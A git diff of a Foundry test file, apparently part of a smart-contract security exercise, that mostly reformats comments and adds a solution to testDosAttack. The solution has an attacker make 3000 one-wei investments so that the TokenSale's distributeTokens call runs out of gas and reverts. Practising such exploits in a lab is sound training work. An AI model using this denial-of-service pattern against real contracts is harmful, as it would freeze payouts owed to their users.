@@ -8,10 +8,9 @@ import "src/dos-1/TokenSale.sol";
 
 /**
  * @dev run "forge test -vvv --match-contract DOS1"
- Note: This is a long running test prepare for ~20 sec.
+ *  Note: This is a long running test prepare for ~20 sec.
  */
 contract TestDOS1 is Test {
-
     uint256 constant USER1_INVESTMENT = 5 ether;
     uint256 constant USER2_INVESTMENT = 15 ether;
     uint256 constant USER3_INVESTMENT = 23 ether;
@@ -25,7 +24,9 @@ contract TestDOS1 is Test {
     TokenSale tokenSale;
 
     function setUp() public {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+        /**
+         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
+         */
         vm.prank(deployer);
         tokenSale = new TokenSale();
 
@@ -47,11 +48,22 @@ contract TestDOS1 is Test {
     }
 
     function testDosAttack() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
 
-        /** SUCCESS CONDITIONS */
+        /**
+         * SUCCESS CONDITIONS
+         */
+        vm.startPrank(attacker);
+        uint256 attackerFunds = 3000;
+        vm.deal(attacker, 3000);
 
-		// DOS to distributeTokens
+        for (uint256 index = 0; index < attackerFunds; index++) {
+            tokenSale.invest{value: 1}();
+        }
+
+        // DOS to distributeTokens
         vm.startPrank(deployer);
         vm.expectRevert();
         tokenSale.distributeTokens();
